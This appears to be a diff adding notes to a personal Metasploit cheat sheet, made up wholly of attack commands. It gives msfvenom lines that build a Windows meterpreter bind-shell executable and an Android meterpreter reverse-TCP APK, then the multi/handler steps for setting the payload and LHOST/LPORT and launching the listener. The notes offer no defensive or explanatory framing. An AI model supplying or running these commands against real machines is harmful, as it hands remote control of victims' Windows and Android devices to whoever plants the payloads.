@@ -1,4 +1,14 @@
+stage 1:
+
 windows bind shell creation--------------------------------------------------------
 msfvenom -p windows/meterpreter/bind_tcp -f exe > ~/shell_code/bind.exe
+
 android bind shell creation--------------------------------------------------------
 msfvenom -p android/meterpreter/reverse_tcp LHOST=...  LPORT=... R > ~/shell_code/bind.apk
+
+stage 2:
+use exploit/multi/handler
+set payload <path/to/payload/payload_name>
+show options     -----    shows the missing fields
+set LHOST/LPORT=<input>
+exploit
